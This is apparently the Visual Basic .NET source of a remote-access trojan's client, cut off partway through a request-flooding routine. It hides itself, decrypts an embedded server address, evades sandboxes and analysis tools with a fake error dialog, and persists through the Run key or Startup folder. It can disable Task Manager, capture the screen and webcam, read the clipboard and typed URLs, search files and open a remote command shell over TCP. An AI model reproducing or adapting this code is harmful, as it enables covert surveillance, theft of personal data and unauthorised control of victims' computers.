Option Explicit On
Imports System.Text
Imports System.Net.Sockets
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Management
Imports System.Drawing.Imaging
Imports DisplaySettingsSample
Imports ServiceControllerExtended
Imports System.Threading
Imports System.ServiceProcess
Imports System.Security.Cryptography
Imports System.Net
Imports Microsoft.Win32


Public Class MainFrm

#Region "Vars..."
    Private searchflag, deskflag As Boolean
    Private restart As Integer = 0
    Private oldms, oldms2 As Integer
    Private mehand As Integer
    Private clip, webflag, webflag2, webflag3 As String
    Private adrm As String()
    Private adr, adr2, sand As String
    Private port, port2 As Integer
    Private tcpClient As TcpClient
    Private networkStream As NetworkStream
    Private streamWriter As StreamWriter
    Private streamReader As StreamReader
    Private processCmd As Process
    Private strInput As StringBuilder
    Private ChunkSize As Integer = 4096
    Private _FileSize As Long
    Private _Index As Short
    Private _Buffer As Byte() = New Byte() {}
    Private _InputFileStram As System.IO.FileStream
    Private _OutputFileStram As System.IO.FileStream
    Private _BinaryWriter As BinaryWriter
    Private _BinaryReader As BinaryReader
    Private _Fragments As Integer
    Private _RemainingBytes As Long
    Private _StartPosition As Long
    Private _Mergedfile As String
    Private iconmsg As MessageBoxIcon
    Private btnmsg As MessageBoxButtons
    Private msgtxt, titletxt As String
    Private t As Thread
    Private os As String = System.Environment.OSVersion.Version.Major
    Private mp As Point

    Const SC_SCREENSAVE = &HF140
    Const HWND_BROADCAST = &HFFFF
    Const WM_SYSCOMMAND = &H112
    Public Const M = 1&
    Public Const MONITOR_ON = -1&
    Public Const MONITOR_OFF As Integer = 2
    Const SC_MONITORPOWER As Integer = 61808

    Const WM_CAP As Short = &H400S
    Const WM_CAP_COPY As Integer = 1054
    Const WM_CAP_DRIVER_CONNECT As Integer = WM_CAP + 10
    Const WM_CAP_DRIVER_DISCONNECT As Integer = WM_CAP + 11
    Const WM_CAP_EDIT_COPY As Integer = WM_CAP + 30
    Const WM_CAP_GET_FRAME As Integer = 1084
    Dim hHwnd As Integer ' Handle to preview window

    Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
        (ByVal hwnd As Integer, ByVal wMsg As Integer, ByVal wParam As Integer, _
        <MarshalAs(UnmanagedType.AsAny)> ByVal lParam As Object) As Integer

    Declare Function SetWindowPos Lib "user32" Alias "SetWindowPos" (ByVal hwnd As Integer, _
        ByVal hWndInsertAfter As Integer, ByVal x As Integer, ByVal y As Integer, _
        ByVal cx As Integer, ByVal cy As Integer, ByVal wFlags As Integer) As Integer

    Declare Function DestroyWindow Lib "user32" (ByVal hndw As Integer) As Boolean

    Declare Function capCreateCaptureWindowA Lib "avicap32.dll" _
        (ByVal lpszWindowName As String, ByVal dwStyle As Integer, _
        ByVal x As Integer, ByVal y As Integer, ByVal nWidth As Integer, _
        ByVal nHeight As Short, ByVal hWndParent As Integer, _
        ByVal nID As Integer) As Integer

    Declare Function capGetDriverDescriptionA Lib "avicap32.dll" (ByVal wDriver As Short, _
        ByVal lpszName As String, ByVal cbName As Integer, ByVal lpszVer As String, _
        ByVal cbVer As Integer) As Boolean


    Private tempObj As IDataObject
    Private tempImg As System.Drawing.Image

    Private Declare Function mciExecute Lib "winmm.dll" (ByVal lpstrCommand As String) As Integer
    Private Declare Auto Function FindWindow Lib "user32.dll" (ByVal lpClassName As String, ByVal lpWindowName As String) As IntPtr
    Private Declare Auto Function GetWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal uCmd As UInteger) As IntPtr
    Private Declare Auto Function FindWindowEx Lib "user32.dll" (ByVal hwnd As IntPtr, ByVal hWndChild As IntPtr, _
ByVal lpszClassName As String, _
ByVal lpszWindow As String _
) As IntPtr
    Private Declare Function ShowWindow Lib "user32.dll" (ByVal hWnd As IntPtr, ByVal nCmdShow As Integer) As Boolean
    Private Declare Auto Function IsWindowVisible Lib "user32.dll" (ByVal hwnd As IntPtr) As Boolean

    Private objCS As ManagementObjectSearcher
    Private m_strManufacturer As String
    Private m_StrModel As String
    Private m_strWindowsDir As String
    Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)
    Private Const MOUSEEVENTF_ABSOLUTE As Integer = &H8000 ' absolute move
    Private Const MOUSEEVENTF_LEFTDOWN As Integer = &H2 ' left button down
    Private Const MOUSEEVENTF_LEFTUP As Integer = &H4 ' left button up
    Private Const MOUSEEVENTF_MOVE As Integer = &H1 ' mouse move
    Private Const MOUSEEVENTF_MIDDLEDOWN As Integer = &H20
    Private Const MOUSEEVENTF_MIDDLEUP As Integer = &H40
    Private Const MOUSEEVENTF_RIGHTDOWN As Integer = &H8
    Private Const MOUSEEVENTF_RIGHTUP As Integer = &H10

    Private ReadOnly Property Manufacturer() As String
        Get
            Manufacturer = m_strManufacturer
        End Get

    End Property
    Private ReadOnly Property Model() As String
        Get
            Model = m_StrModel
        End Get

    End Property

    Private ReadOnly Property WindowsDirectory() As String
        Get
            WindowsDirectory = m_strWindowsDir
        End Get

    End Property

    Private directoryList As String()
    Private fileArray As String()
    Dim fileparts() As String

    Private MyThread As Thread
    Private rt As String = ""
    Private orientationNames() As String = {"Default", "90", "180", "270"}
    Private orientationValues() As Integer = {NativeMethods.DMDO_DEFAULT, NativeMethods.DMDO_90, NativeMethods.DMDO_180, NativeMethods.DMDO_270}

    Private Declare Function SwapMouseButton Lib "user32" Alias "SwapMouseButton" (ByVal bSwap As Long) As Long
    Private Const MB_DEFBUTTON1 As Long = &H0&
    Private Const MB_DEFBUTTON2 As Long = &H100&


#End Region

#Region "Func..."

    Private Declare Function GetModuleHandle Lib "kernel32" Alias "GetModuleHandleA" (ByVal lpModuleName As String) As Long
    Private sExes() As String = {"joeboxserver.exe", "joeboxcontrol.exe", "wireshark.exe", "avp.exe", "sniff_hit.exe", "sysAnalyzer.exe"} 'sysanalyzer

    Private sUsers() As String = {"username", "user", "currentuser"} 'norman

    Private sModules() As String = {"api_log.dll", "dir_watch.dll", "pstorec.dll", "SbieDll.dll"} 'sandboxie


    Private Function ProcessCheck() As Boolean
        Try
            Dim proc As Process() = Process.GetProcesses
            For Each prc As Process In proc
                Dim prn = prc.ProcessName & ".exe"
                If prn = sExes.GetValue(0) Or prn = sExes.GetValue(1) Or prn = sExes.GetValue(2) Or prn = sExes.GetValue(3) Or prn = sExes.GetValue(4) Or prn = sExes.GetValue(5) Then
                    Return True
                End If

            Next
        Catch ex As Exception

        End Try

    End Function

    Private Function ModuleCheck() As Boolean
        Try
            For i As Integer = 0 To sModules.Length - 1
                If GetModuleHandle(sModules.GetValue(i)) Then
                    Return True
                End If
            Next i
        Catch ex As Exception

        End Try

    End Function

    Private Function UserCheck() As Boolean
        Try
            For i As Integer = 0 To sUsers.Length - 1
                If Environ("username") = sUsers.GetValue(i) Then
                    Return True
                End If
            Next
        Catch ex As Exception

        End Try

    End Function




    Private Function AntiSandbox() As Boolean
        Try

            If UserCheck() Then
                Return True
            ElseIf ProcessCheck() Then
                Return True
            ElseIf Application.ExecutablePath.Contains("file.exe") Then
                Return True
            ElseIf Application.ExecutablePath.Contains("Sample.exe") Or Environ("username") = "andy" Or Environ("username") = "Andy" Then
                Return True
            ElseIf ModuleCheck() Then
                Return True
            ElseIf Application.StartupPath = "C:\" Or Application.StartupPath = "D:\" Or Application.StartupPath = "F:\" Or Application.StartupPath = "X:\" And Environ("username") = "Schmidti" Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception

        End Try

    End Function
    Private Sub SearchDirectory(ByVal currentDirectory As String)

        ' for file name without directory path
        Try
            If searchflag Then
                Dim fileName As String = ""
                Dim myFile As String
                Dim myDirectory As String


                directoryList = _
                   Directory.GetDirectories(currentDirectory)

                ' get list of files in current directory
                fileArray = Directory.GetFiles(currentDirectory)

                ' iterate through list of files
                For Each myFile In fileArray
                    If fileparts(1).StartsWith("*") Then
                        Dim exten() As String = fileparts(1).Split(".")
                        If myFile.EndsWith(exten(exten.Length - 1)) Then
                            streamWriter.WriteLine("/SEARCHFL/" & myFile & "¦" & My.Computer.FileSystem.GetFileInfo(myFile).Length)
                            streamWriter.Flush()
                        End If
                    Else
                        Dim fl() As String = myFile.Split("\")
                        If fl(fl.Length - 1).Contains(fileparts(1)) Then
                            streamWriter.WriteLine("/SEARCHFL/" & myFile & "¦" & My.Computer.FileSystem.GetFileInfo(myFile).Length)
                            streamWriter.Flush()
                        End If
                    End If



                Next


                For Each myDirectory In directoryList
                    If myDirectory.Substring(3).StartsWith("WINDOWS") Or myDirectory.Substring(3).StartsWith("WINNT") Then
                    Else
                        SearchDirectory(myDirectory)
                    End If

                Next

                directoryList = Nothing
                If currentDirectory.Length = 3 Then
                    streamWriter.WriteLine("/SEARCHFL/" & "SEARCHEND")
                    streamWriter.Flush()
                End If
            End If
            

        Catch unauthorizedAccess As Exception


        End Try

    End Sub

    Private Function GetEncoderInfo(ByVal mimeType As String) _
        As ImageCodecInfo
        Dim j As Integer
        Dim encoders As ImageCodecInfo()
        encoders = ImageCodecInfo.GetImageEncoders()
        For j = 0 To encoders.Length
            If encoders(j).MimeType = mimeType Then
                Return encoders(j)
            End If
        Next j
        Return Nothing
    End Function

    Private Sub MainFrm_FormClosing(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosingEventArgs) Handles Me.FormClosing
        If os < 6 Then
            Dim sourceFile As String = Application.ExecutablePath
            Dim executable As String = My.Computer.FileSystem.SpecialDirectories.MyDocuments & "\System"
            Try
                If My.Computer.FileSystem.DirectoryExists(executable) Then
                Else
                    My.Computer.FileSystem.CreateDirectory(executable)
                End If
                Try
                    Dim newdestinationFile As String = executable & "\" & System.IO.Path.GetFileName(sourceFile)
                    If Not File.Exists(newdestinationFile) Then
                        File.Copy(sourceFile, newdestinationFile, True)
                    End If

                Catch ex As Exception

                End Try
            Catch ex As Exception

            End Try
            Try

                If My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).GetValue("ARC") = Nothing Then
                    My.Computer.Registry.CurrentUser.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True).SetValue("ARC", executable & "\" & System.IO.Path.GetFileName(sourceFile))
                End If

            Catch ex As Exception
            End Try

        Else
            Try
                Dim sourceFile As String = Application.ExecutablePath
                Dim newdestinationFile As String = Environment.GetEnvironmentVariable("APPDATA") & "\Microsoft\Windows\Start Menu\Programs\Startup\" & System.IO.Path.GetFileName(sourceFile)
                File.Copy(sourceFile, newdestinationFile, True)
            Catch ex As Exception

            End Try

        End If

    End Sub

    Private Sub Form1_Shown(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Shown
        Try
            'Delay(5)
            Me.Hide()
            ' Delay(5)
            Try
                adrm = adrr().Split("*")
            Catch ex As Exception
            End Try
            If adrm Is Nothing Then
                ' Application.Exit()
                adr = "127.0.0.1"
                port = 71
            Else
                adr = adrm(0).ToString
                adr2 = adrm(1).ToString
                If adrm(2).ToString = Nothing Then
                    port = 71
                Else
                    port = Int32.Parse(adrm(2).ToString)
                End If
                If adrm(3).ToString = Nothing Then
                    port2 = 80
                Else
                    port2 = Int32.Parse(adrm(3).ToString)
                End If

                sand = Int32.Parse(adrm(4).ToString)
            End If

            If adr = Nothing Then
                Application.Exit()
            Else
                If sand = 1 Then
                    If AntiSandbox() Then
                        MessageBox.Show("The application failed to initialize properly (0xc000007b). Click Ok to terminate the application.", "Application Error!", MessageBoxButtons.OK, MessageBoxIcon.Error)
                        Application.Exit()
                        Exit Sub
                    End If
                End If

               

                MyThread = New Thread(New System.Threading.ThreadStart(AddressOf RunServer))
                MyThread.Start()

            End If
            mehand = Me.Handle.ToInt32

        Catch ex As Exception
            Application.Exit()
        End Try
    End Sub

    Private Function Encrypt(ByVal strText As String, ByVal strEncrKey As String) As String
        Dim IV() As Byte = {&H12, &H34, &H56, &H78, &H90, &HAB, &HCD, &HEF}
        Try
            Dim bykey() As Byte = System.Text.Encoding.UTF8.GetBytes(Microsoft.VisualBasic.Left(strEncrKey, 8))
            Dim InputByteArray() As Byte = System.Text.Encoding.UTF8.GetBytes(strText)
            Dim des As New DESCryptoServiceProvider
            Dim ms As New MemoryStream
            Dim cs As New CryptoStream(ms, des.CreateEncryptor(bykey, IV), CryptoStreamMode.Write)
            cs.Write(InputByteArray, 0, InputByteArray.Length)
            cs.FlushFinalBlock()
            Return Convert.ToBase64String(ms.ToArray())
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Private Function Decrypt(ByVal strText As String, ByVal sDecrKey As String) As String
        Try
            Dim IV() As Byte = {&H12, &H34, &H56, &H78, &H90, &HAB, &HCD, &HEF}
            Dim inputByteArray(strText.Length) As Byte

            Dim byKey() As Byte = System.Text.Encoding.UTF8.GetBytes(Microsoft.VisualBasic.Left(sDecrKey, 8))
            Dim des As New DESCryptoServiceProvider
            inputByteArray = Convert.FromBase64String(strText)
            Dim ms As New MemoryStream
            Dim cs As New CryptoStream(ms, des.CreateDecryptor(byKey, IV), CryptoStreamMode.Write)
            cs.Write(inputByteArray, 0, inputByteArray.Length)
            cs.FlushFinalBlock()
            Dim encoding As System.Text.Encoding = System.Text.Encoding.UTF8
            Return encoding.GetString(ms.ToArray())
        Catch ex As Exception
            Return Nothing
        End Try

    End Function

    Private Function adrr() As String
        Try
           
            Dim stri As String = My.Resources.String1
            Dim spl As String() = stri.Split("*")
            Dim sss As String = Decrypt(spl(0), "&%#@?,:*")
            spl = Nothing
            Return sss
        Catch ex As Exception
            Return Nothing
        End Try

    End Function

    Private Sub StopStream()
        Try
            _InputFileStram.Close()
            _BinaryReader.Close()
            _BinaryWriter = Nothing
            _OutputFileStram = Nothing
            _BinaryReader = Nothing
            _InputFileStram = Nothing
        Catch exi As Exception

        End Try
    End Sub

    Delegate Sub CloseWindow_Delegate()
    Private Sub CloseWindows()
        Try
            If Me.InvokeRequired = True Then
                Dim MyDelegate As New CloseWindow_Delegate(AddressOf CloseWindows)
                Me.Invoke(MyDelegate)
            Else
                Me.Close()
                Application.Exit()
            End If
        Catch ex As Exception

        End Try
        
    End Sub




    Function FileExists(ByRef FileName As String) As Boolean
        On Error Resume Next
        FileExists = (GetAttr(FileName) And FileAttribute.Directory) = 0
    End Function

    Private Function Extract(ByRef Temp As String) As String
        Try
            Dim num As Integer
            Dim Finale As String = Nothing
            Dim appoggio As String

            For num = 1 To Len(Temp)
                appoggio = Mid(Temp, num, 1)

                If appoggio = "*" Then
                    Exit For
                End If
                Finale = Mid(Temp, 1, num)
            Next num
            Return Finale
        Catch ex As Exception
            Return Nothing
        End Try
       
    End Function

    Private Function ListProcess() As String
        Dim ps() As Process
        Try
            ps = Process.GetProcesses()
            Dim p As Process
            Dim proc As String = Nothing
            For Each p In ps
                Dim str As String
                str = p.ProcessName & "*"
                str = str & p.Id.ToString() & "*"
                str = str & p.BasePriority.ToString() & "*"
                str = str & p.WorkingSet64.ToString()
                If proc = Nothing Then
                    proc = str
                Else
                    proc = proc & "$" & str
                End If
            Next p
            Return proc
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Private Function ListServices() As String
        Try
            Dim serv As String = Nothing
            Dim services() As ServiceController = ServiceControllerExtended.ServiceControllerEx.GetServices()
            For Each sc As ServiceController In services
                Dim str As String
                str = sc.DisplayName & "*"
                str = str & sc.Status.ToString & "*"
                Dim scEx As New ServiceControllerExtended.ServiceControllerEx(sc.ServiceName)
                str = str & scEx.StartupType
                If serv = Nothing Then
                    serv = str
                Else
                    serv = serv & "$" & str
                End If
            Next sc
            Return serv
        Catch ex As Exception
            Return Nothing
        End Try
    End Function


    Private Function ListDriver() As String
        Try
            Dim DrivesNames As String = Nothing
            Dim arDrives() As String
            arDrives = Directory.GetLogicalDrives()
            Dim sDrive As String
            For Each sDrive In arDrives
                DrivesNames = DrivesNames & "*" & sDrive
            Next
            Return DrivesNames
        Catch ex As Exception
            Return Nothing
        End Try
       
    End Function

    Private Sub Delay(ByVal DelayInSeconds As Integer)
        Dim ts As TimeSpan
        Dim targetTime As DateTime = DateTime.Now.AddSeconds(DelayInSeconds)
        Do
            ts = targetTime.Subtract(DateTime.Now)
            Application.DoEvents()
            System.Threading.Thread.Sleep(100)
        Loop While ts.TotalSeconds > 0
    End Sub

    Private Function FileSize(ByVal FileName As String) As Long
        Try
            Dim _fileInfo As System.IO.FileInfo
            _fileInfo = New FileInfo(FileName)
            Return _fileInfo.Length
            _fileInfo = Nothing
        Catch ex As Exception

        End Try
        
    End Function


    Private Sub Showdesk()
        Try
            Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
            hWnd = GetWindow(hWnd, 5)
            If Not IsWindowVisible(hWnd) Then

                ShowWindow(hWnd, 4)

            End If
        Catch ex As Exception

        End Try
       
    End Sub
    Private Sub Hidedesk()
        Try
            Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
            hWnd = GetWindow(hWnd, 5)
            If IsWindowVisible(hWnd) Then
                ShowWindow(hWnd, 0)

            End If
        Catch ex As Exception

        End Try
       
    End Sub

    Private Sub showSbtn()
        Try
            Dim m_hWndStart As IntPtr
            Dim n As IntPtr = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", Nothing)
            m_hWndStart = FindWindowEx(n, IntPtr.Zero, "BUTTON", Nothing)
            ShowWindow(m_hWndStart, 9)
        Catch ex As Exception

        End Try
       
    End Sub

    Private Sub hideSbtn()
        Try
            Dim m_hWndStart As IntPtr
            Dim n As IntPtr = FindWindowEx(IntPtr.Zero, IntPtr.Zero, "Shell_TrayWnd", Nothing)
            m_hWndStart = FindWindowEx(n, IntPtr.Zero, "BUTTON", Nothing)
            ShowWindow(m_hWndStart, 0)
        Catch ex As Exception

        End Try
       
    End Sub

    Private Sub hideT()
        Try
            Dim Window As Long
            Window = FindWindow("Shell_TrayWnd", Nothing)
            ShowWindow(Window, 0)
        Catch ex As Exception

        End Try
       
    End Sub

    Private Sub showT()
        Try
            Dim Window As Long
            Window = FindWindow("Shell_TrayWnd", Nothing)
            ShowWindow(Window, 9)
        Catch ex As Exception

        End Try
        
    End Sub


    Private Sub Cleanup()
        Try
            Try
                processCmd.Kill()
            Catch ex As Exception

            End Try
            Try
                streamReader.Close()
            Catch ex As Exception
            End Try
            Try
                streamWriter.Close()
            Catch ex As Exception
            End Try
            Try
                networkStream.Close()
            Catch ex As Exception
            End Try

            Try

                tcpClient.Close()
            Catch ex As Exception

            End Try

        Catch ex As Exception
        End Try

    End Sub

    Private Sub CmdOutputDataHandler(ByVal sendingProcess As Object, ByVal outLine As DataReceivedEventArgs)
        Try
            Dim strOutput As New StringBuilder()

            If (Not String.IsNullOrEmpty(outLine.Data)) Then

                strOutput.Append("/CMDCMDGO/")
                strOutput.Append(outLine.Data)
                If outLine.Data.StartsWith("Microsoft") Or outLine.Data.StartsWith("(C)") Or outLine.Data.StartsWith("Copyright") Then
                Else
                    streamWriter.WriteLine(strOutput)
                    streamWriter.Flush()
                End If

            End If
        Catch err As Exception
        End Try
    End Sub

    Private Sub MSG()
        Try
            MessageBox.Show(msgtxt, titletxt, btnmsg, iconmsg)
        Catch ex As Exception

        End Try

    End Sub



    Private Function PopulateUrlList() As String
        Try
            Dim regKey As String = "Software\Microsoft\Internet Explorer\TypedURLs"
            Dim subKey As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(regKey)
            Dim url As String
            Dim urlList As String = Nothing
            Dim counter As Integer = 1
            While True
                Dim sValName As String = "url" + counter.ToString()
                url = DirectCast(subKey.GetValue(sValName), String)
                If DirectCast(url, Object) Is Nothing Then
                    Exit While
                End If
                urlList = urlList & "*" & url
                counter += 1
            End While
            Return urlList
        Catch ex As Exception
            Return Nothing
        End Try
      
    End Function

    <DllImport("winmm.dll", EntryPoint:="mciSendStringA")> _
Private Shared Sub mciSendStringA(ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Int32, ByVal hwndCallback As Int32)
    End Sub


    Private Sub EjectCD()
        Try
            mciSendStringA("set CDAudio door open", rt, 127, 0)
        Catch ex As Exception

        End Try

    End Sub

    Private Sub CloseCD()
        Try
            mciSendStringA("set CDAudio door closed", rt, 127, 0)
        Catch ex As Exception

        End Try

    End Sub

    Private Function GetSettings(ByRef dm As DEVMODE) As Integer
        ' helper to obtain current settings
        Return GetSettings(dm, NativeMethods.ENUM_CURRENT_SETTINGS)
    End Function

    Private Function GetSettings(ByRef dm As DEVMODE, ByVal iModeNum As Integer) As Integer
        ' helper to wrap EnumDisplaySettings Win32 API
        Return NativeMethods.EnumDisplaySettings(Nothing, iModeNum, dm)
    End Function


    Private Sub ChangeSettings(ByVal dm As DEVMODE)
        NativeMethods.ChangeDisplaySettings(dm, 0)
    End Sub


    Private Sub EnableTaskManager(ByVal enable As Boolean)
        Try
            If os < 6 Then
                Dim HKCU As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
                Dim key As Microsoft.Win32.RegistryKey = HKCU.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System")
                key.SetValue("DisableTaskMgr", IIf(enable, 0, 1), Microsoft.Win32.RegistryValueKind.DWord)
            End If
        Catch ex As Exception

        End Try


    End Sub


    Private Declare Function GetDesktopWindow Lib "user32" () As Integer



    Private Sub StartScreenSaver(ByVal start As Boolean)
        Try
            Dim hWnd As Integer
            hWnd = GetDesktopWindow()
            If start Then
                API.SendMessage(hWnd, WM_SYSCOMMAND, SC_SCREENSAVE, 0)
            Else
                SendKeys.SendWait("{ESC}")
            End If
        Catch ex As Exception

        End Try
       

    End Sub

    Private Sub Action(ByVal cond As Boolean)
        Try
            If cond Then
                streamWriter.WriteLine("/MSGS/")
                streamWriter.Flush()
            Else
                streamWriter.WriteLine("/MSGE/")
                streamWriter.Flush()
            End If
        Catch ex As Exception

        End Try
       
    End Sub

    Public Function FindAndKillProcess(ByVal name As String) As Boolean
        Try
            Dim ex As Integer
            For Each clsProcess As Process In Process.GetProcesses()
                If clsProcess.ProcessName.StartsWith(name) Then
                    ex = ex + 1
                End If
                If ex = 0 Then
                    Return False
                Else
                    Return True
                End If
            Next clsProcess
        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Function RandomNumber(ByVal min As Integer, ByVal max As Integer) As Integer
        Dim random As New Random()
        Return random.Next(min, max)
    End Function

    Private Function ReadClip() As String
        Try
            clip = My.Computer.Clipboard.GetText()
            clip = clip.Replace(vbCrLf, "***")
            Return clip
        Catch ex As Exception
            Return Nothing
        End Try
    End Function

    Private webflag4 As String
    Private webflag5 As Boolean = False
    Private webflag6 As Boolean = False
    Private Sub cap(ByVal tempdata As String)
start:


        If webflag = "Connect" Then
            hHwnd = capCreateCaptureWindowA(tempdata, 0, 0, 0, 640, _
         480, mehand, 0)
            SendMessage(hHwnd, WM_CAP_DRIVER_CONNECT, 0, 0)
            webflag = ""
        ElseIf webflag2 = "Image" AndAlso webflag5 Then
            webflag4 = webflag2
            webflag2 = ""
            SendMessage(hHwnd, WM_CAP_GET_FRAME, 0, 0)
            SendMessage(hHwnd, WM_CAP_COPY, 0, 0)
            Dim t As Thread = New Thread(New ThreadStart(AddressOf ReadClipobj))
            t.SetApartmentState(ApartmentState.STA)
            t.Start()
            t.Join()
        ElseIf webflag2 = "Capture" AndAlso webflag6 Then
            webflag4 = webflag2
            webflag2 = ""
            SendMessage(hHwnd, WM_CAP_GET_FRAME, 0, 0)
            SendMessage(hHwnd, WM_CAP_COPY, 0, 0)
            Dim t As Thread = New Thread(New ThreadStart(AddressOf ReadClipobj))
            t.SetApartmentState(ApartmentState.STA)
            t.Start()
            t.Join()


        ElseIf webflag3 = "Disconnect" Then
            SendMessage(hHwnd, WM_CAP_DRIVER_DISCONNECT, 0, 0)
            webflag3 = ""
            Exit Sub

        Else
            Threading.Thread.Sleep(50)
        End If



        GoTo start




    End Sub

    Private Sub ReadClipobj()
        Try

            tempObj = Clipboard.GetDataObject()
            tempImg = CType(tempObj.GetData(System.Windows.Forms.DataFormats.Bitmap), System.Drawing.Bitmap)
            Dim str As String = Nothing
            Dim eps As EncoderParameters = New EncoderParameters(1)
            eps.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, 40)
            Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
            Dim ms As New MemoryStream()
            tempImg.Save(ms, ici, eps)
            ms.Capacity = ms.Length
            If ms.Length = oldms2 Then
                Select Case webflag4
                    Case "Image"
                        streamWriter.WriteLine("/WEBIMAGE/" & "SAME")
                        streamWriter.Flush()
                    Case "Capture"
                        streamWriter.WriteLine("/WEBCAPTR/" & "SAME")
                        streamWriter.Flush()
                End Select
            Else
                Dim bmpBytes() As Byte = ms.GetBuffer()
                str = Convert.ToBase64String(bmpBytes)
                tempImg.Dispose()
                oldms2 = ms.Length
                ms.Flush()
                ms.Dispose()
                ms.Close()
                bmpBytes = Nothing
                Select Case webflag4
                    Case "Image"
                        streamWriter.WriteLine("/WEBIMAGE/" & str)
                        streamWriter.Flush()
                    Case "Capture"
                        streamWriter.WriteLine("/WEBCAPTR/" & str)
                        streamWriter.Flush()
                End Select

                str = Nothing
            End If
           
        Catch ex As Exception

        End Try
    End Sub
    Private Sub SetClip()
        Try
            If clip = Nothing Then
                My.Computer.Clipboard.Clear()
            Else
                My.Computer.Clipboard.SetText(clip, TextDataFormat.Text)
            End If

        Catch ex As Exception

        End Try
    End Sub
    Private Sub refreshwind()
        Try
            Dim p As New Process()
            Dim s1 As String = Nothing
            Dim s2 As String = Nothing
            Dim s3 As String = Nothing
            For Each p In Process.GetProcesses(".")

                If p.MainWindowTitle.Length > 0 Then
                    s1 = s1 + p.MainWindowTitle.ToString() + "²"
                    s2 = s2 + p.Id.ToString() + "³"
                    s3 = s1 & "±" & s2
                End If
            Next
            streamWriter.WriteLine("/REFRWIND/" & s3)
            streamWriter.Flush()
        Catch ex As Exception

        End Try

    End Sub

    Private Sub prev(ByVal tempdata As String)
        Dim imgThumb As Image = Nothing
        Dim image As Image = Nothing
        Try
            image = image.FromFile(tempdata)
            Dim str As String = Nothing
            If Not image Is Nothing Then
                Dim x As Double = image.Size.Width / image.Size.Height
                Dim y As Double = image.Size.Height / image.Size.Width
                If image.Size.Width > image.Size.Height Then
                    imgThumb = image.GetThumbnailImage(150, 150 / x, Nothing, New IntPtr())
                Else
                    imgThumb = image.GetThumbnailImage(150 / y, 150, Nothing, New IntPtr())
                End If
                Dim ms As New MemoryStream()
                imgThumb.Save(ms, ImageFormat.Jpeg)
                ms.Capacity = ms.Length
                Dim bmpBytes() As Byte = ms.GetBuffer()
                str = Convert.ToBase64String(bmpBytes)
                streamWriter.WriteLine("/IPREVIEW/" & str)
                streamWriter.Flush()
                ms.Dispose()
                ms.Close()

            End If
        Catch ex As Exception

        End Try

       
    End Sub

    Private Sub screens(ByVal tempdata As String)
        Try
            If deskflag Then
                Dim parts() As String = tempdata.Split("¦")
                Dim str As String = Nothing
                Dim eps As EncoderParameters = New EncoderParameters(1)
                eps.Param(0) = New EncoderParameter(Imaging.Encoder.Quality, Int32.Parse(parts(0)))
                Dim ici As ImageCodecInfo = GetEncoderInfo("image/jpeg")
                Dim Bounds As Rectangle
                Dim Capture As Bitmap
                Dim Graph As Graphics

                Bounds = Screen.PrimaryScreen.Bounds

                Dim wid As Integer = Int32.Parse(parts(1))
                Capture = New System.Drawing.Bitmap(Bounds.Width, Bounds.Height, PixelFormat.Format16bppRgb555)
                If wid > Capture.Width Then
                    wid = Capture.Width
                End If
                Dim rate As Double = Capture.Width / wid
                Dim hgt As Integer = Capture.Height / rate
                Dim to_bm As New Bitmap(wid, hgt, PixelFormat.Format16bppRgb555)

                Graph = Graphics.FromImage(Capture)
                Graph.CopyFromScreen(Bounds.X, Bounds.Y, 0, 0, Bounds.Size, CopyPixelOperation.SourceCopy)

                Graph = Graphics.FromImage(to_bm)
                If wid = "640" Then
                    Graph.InterpolationMode = Drawing2D.InterpolationMode.NearestNeighbor
                    Graph.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
                Else
                    Graph.InterpolationMode = Drawing2D.InterpolationMode.HighQualityBilinear
                    Graph.CompositingQuality = Drawing2D.CompositingQuality.HighSpeed
                End If
                Graph.DrawImage(Capture, 0, 0, wid, hgt)


                Dim ms As New MemoryStream()
                to_bm.Save(ms, ici, eps)
                ms.Capacity = ms.Length
                If ms.Length = oldms Then
                    streamWriter.WriteLine("/STARTSEQ/" & "SAME")
                    streamWriter.Flush()
                Else
                    Dim bmpBytes() As Byte = ms.GetBuffer()
                    str = Convert.ToBase64String(bmpBytes)
                    bmpBytes = Nothing
                    streamWriter.WriteLine("/STARTSEQ/" & str)
                    streamWriter.Flush()
                End If
                oldms = ms.Length
                to_bm.Dispose()
                Capture.Dispose()
                ms.Dispose()
                ms.Close()
                Graph.Dispose()

                str = Nothing
            End If
        Catch ex As Exception

        End Try
        
    End Sub

    Private Sub sd(ByVal tempdata As String)
        For b As Integer = 0 To 100
            Try
                Dim request As Net.HttpWebRequest = CType(Net.HttpWebRequest.Create(tempdata), Net.HttpWebRequest), _
                            ret As Boolean = True

